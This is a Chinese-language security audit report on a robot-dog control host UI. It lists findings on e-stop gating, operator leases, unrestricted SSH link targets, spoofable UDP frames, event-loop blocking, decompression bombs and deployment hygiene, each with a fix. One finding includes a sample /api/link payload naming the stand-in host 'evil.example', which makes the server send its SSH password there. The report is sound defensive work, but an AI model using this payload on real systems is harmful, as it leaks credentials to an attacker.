### P0-2 REST 面无 CSRF/Origin/Host 防护（审计已知，只修了 WS 半边）

## 4. P1 安全与实机风险

### 4.1 控制权/急停语义（B、D 交叉确认，Lead 复核）
1. **REST 急停复位无操控权门禁**：`/api/estop`(engaged=false) 与 `/api/estop/reset`（server.py:667-681）无 `_operator_gate`；WS 同语义有（server.py:334-339）。且 `hold_s` 由客户端自报（node.py:510-513），官方验收工具就直接发 `hold_s:2.0`（tools/real_robot_acceptance.py:226）——门槛形同虚设。修复：REST 补 gate；复位改两段式（begin 记服务端时刻，confirm 校验实际经过时长）。
2. **租约不校验心跳来源**（server.py:316-318 无条件 note_operator_activity）：任意观察者页面可为导航续命；操控者页签关闭后 `release_operator` 不取消导航（node.py:342-352）→ **无操控者的自主导航持续运行**，违背审计 P0-B#6 意图。修复：heartbeat 仅认操控者本人；`operator_id is None && require_operator` 视同 stale。
3. **cancel_posture 竞态**（node.py:479-486）：取消姿态立即 `end_posture()` 解除零速锁，但机载 `/airace/stand|lie` 物理动作不会因主机取消而中止（等待线程最长还要 12s，ssh_ros.py:657-702）→ 机器狗趴下过程中可接受 teleop，与机载动作打架。修复：删掉 cancel_posture/engage_estop 里的提前解锁，由 `_run_posture` 线程退出时统一解锁。
4. **`/api/config` 可无门禁下调安全参数并持久化**（server.py:578-592）：require_operator=false、estop_reset_hold_s→0.3、state_timeout_s→5 都在 clamp 内合法。修复：安全段改动需操控权+事件留痕；require_operator 禁止运行期关闭。

### 4.2 链路/网络暴露面（B）
5. **`/api/link` 目标不受限**（server.py:273-286 只验格式）：`{"kind":"ssh_ros","options":{"host":"evil.example"}}` → `ssh_ros._connect` 用 `HOST_UI_SSH_PASSWORD` 向该主机认证（ssh_ros.py:260-263）→ **密码明文被恶意 SSH 服务端记录**。修复：host/robot_ip 限制在配置声明子网（192.168.1.0/24）或显式白名单；README:257 措辞与实现对齐。
6. **`web.host=0.0.0.0` 时 WS 必然 1008 拒绝**：`_allowed_origins` 刻意排除 0.0.0.0/::（server.py:80-81），而局域网用户以 `http://<LAN-IP>:8710` 访问，Origin 不在白名单；run.py:88-94 却打印带 token 的 URL 引导局域网访问。修复：绑定通配地址时凭正确 token 放行 Origin，或启动提示配置 allowed_origins。
7. **SSH 连接硬依赖 SFTP 上传建图 launch**（ssh_ros.py:264-271）：本地文件缺失或远端目录（硬编码 `/home/ysc/airace_deployment_20261114/…`）不存在 → TransportError → 连接/自动重连永远失败。修复：sftp 失败降级为 warn+禁用 mapping 能力，不阻断链路；远端路径做成 option。
8. **vendor_udp 绑定 0.0.0.0:43898 无 peer 校验**（vendor_udp.py:217,344-363）：LAN 内任意主机可伪造 196B 状态帧（假 basic=6/假位姿）欺骗安全门与界面。修复：校验来源 IP=robot_ip，或默认绑回环+文档注明。
9. **鉴权细节**：`_is_loopback` 硬编码 `"testclient"` 字符串留在生产判定（server.py:70）；非 ASCII token 使 `hmac.compare_digest(str,str)` 抛 TypeError → 500 而非 403（server.py:87-90）。

### 4.3 实时性/健壮性（B）
10. **事件循环内同步阻塞**（系统性）：`dispatch_client_message` 在 async endpoint 内直接执行（server.py:892）——arm 最长 10s、disarm 8s、厂商 estop 回执 2s、ros1 ServiceProxy 无超时可无限挂起（ros1.py:504-548）、`plan_path` 1000×1000 图仅 EDT 1.17s（25MB PGM≈25M 像素推算分钟级）、map_save 写盘、`/api/map/upload` async def 内同步解码。阻塞期间控制环/广播环全停，**其他客户端的 WS 急停被排队**，前端"1.5s ack 确认"必然误报。传输层 0.3s 看门狗补零兜底成立，故未升级 P0。修复：阻塞动作统一 `run_in_executor`，或仿 posture 的线程+状态机异步回执。
11. **地图上传只有 25MB 文件上限**：`zlib.decompress` 无 max_length（mapstore.py:290）、IHDR 宽高无上限 → 解压炸弹/OOM；PGM 2500 万像素纯 Python 双重循环（mapstore.py:333-353）。修复：解码前按头部拒绝（如 ≤2048×2048 或 ≤4M 格）+ `zlib.decompress(…, max_length=N)` + 移入线程池。
12. **YAML origin yaw 单位错误**（mapstore.py:381-390）：ROS map_server 规范是**弧度**，代码直接当度用（types.py:113-124 按度旋转）；yaw≠0 的地图必错位（SSH 流侧自己做了 rad→deg，ssh_ros_stream.py:399-405，证明约定确为度）。修复：`load_ros_map` 中 `math.degrees(origin[2])`。
13. **SafetyCore 加速度限制 dt≤0 时输出冻结**（state.py:277-291）：dt=0 → 保持上一拍非零值且无法减速（真实 monotonic 不触发，时钟注入/同步双 tick 会显现）。dt≤0 应走零速分支。
14. **配置落盘非原子、并发无锁**（config.py:264-272）：WS map_align（事件循环）与 REST limits/config（线程池）并发 save 可撕裂；损坏 JSON 使启动直接 traceback。修复：tmp+os.replace + save 锁。
15. **Recorder 竞态与无上限**：write/stop 竞态静默丢行且 `except: pass` 吞错（recorder.py:102-127）；archive_latest 并发下载互相覆盖同一 zip；**无任何大小/时长轮转**（实测 ~8.9MB/h，长期运行吃满磁盘）；崩溃会话无完整性标记（session_191834 被硬杀，meta 无 stopped_at，与正常会话无法区分）。

### 4.4 协议/机载层（A，Lead 复核 20:30 仍在）
16. **兜底急停随机源端口**（ssh_ros_stream.py:208-216 `_send_vendor` 未 bind；:473 estop 兜底、:616 退出还手柄）：文档只说"0x2* 指令只可有一个终端下发"（接口文档 PDF 第5页），**终端识别按源 IP 还是源端口未定义**；bridge 特意绑 43893（lite2_live.py:62-71），而 lite2_live.py:63-64 注释当天从"按源端口"改成"按源 IP"——两版实测结论矛盾。风险：bridge 挂掉时兜底急停被运动主机丢弃 + 导航速度指令超时行为文档未定义（摇杆轴明确"长期有效直到停止指令"）→ 不能排除速度锁存。**机器人现已在线，应立即抓包仲裁**并把结论写进契约。

## 5. P2 汇总（按主题归并，细节见各分报告要点）

## 7. 工程卫生与部署链路（D 组 + Lead 实证）

1. **host_ui 未入 Git（Lead 实证：.git/index 中 "host_ui" 出现 0 次，最后提交 2026-11-13 16:24）**。行动顺序：先补 .gitignore（`host_ui/sessions/`、`host_ui/config.json`、`.pytest_cache/`、`host_ui/tests/.pytest-tmp/`、`*.zip`）→ 清除 tmp/ssh_push.py 明文密码（改环境变量，与 host_ui 本体做法一致）→ 首次提交 host_ui 全部源码/测试/文档 → 入库最小 fixture 地图并改造 test_control_features（当前硬依赖未入库的 maps/）。
2. **bridge 版本漂移不可检测**：机载 lite2_live.py 无 VERSION 常量，旧 bridge 缺服务时 host 只见"桥接未运行或姿态服务不可用"，无法区分"没启动"与"版本旧"；当天已实际发生"推送成功但重启中断"。修复：bridge_started 事件带版本/文件 hash，host 比对仓库副本并在健康卡告警。
3. **多单元手动部署无原子性**：bridge 运行依赖 ≥4 个单元（execution_guard、vendor_protocol、navigation_core 包、numpy），全手动、无 manifest/校验和。建议 tar 整体推送 + 远端 md5 清单。
4. **注入式 stream 环境耦合**：~30KB base64 命令行在机器人 `ps` 全程可见（源码泄露，非凭据）；依赖 `python`=py2.7、bash source 路径、机载 cv2/numpy——任一变化即静默断流，且这些依赖未见于任何 requirements/文档。
5. **双 Python 运行时时钟契约仅靠约定**：stream(py2.7 ctypes CLOCK_MONOTONIC) 与 bridge(py3 monotonic) 同源靠文档+字符串测试锁定；好在失效模式 fail-safe（错位即 stale_depth 禁运动），但排障成本高，建议 bridge 对 depth 值异常（value>now 等）上报独立 reason。
6. **host↔机载 JSON 无 schema 校验**：字段演进靠契约人工同步，新增字段错位不会被现有测试发现。
7. **产物卫生**：sessions/ 22 文件 8.78MB（19:55）且 ~8.9MB/h 无上限增长；maps/ 被测试硬依赖（与"运行产物不入库"矛盾，用 fixture 解耦）。
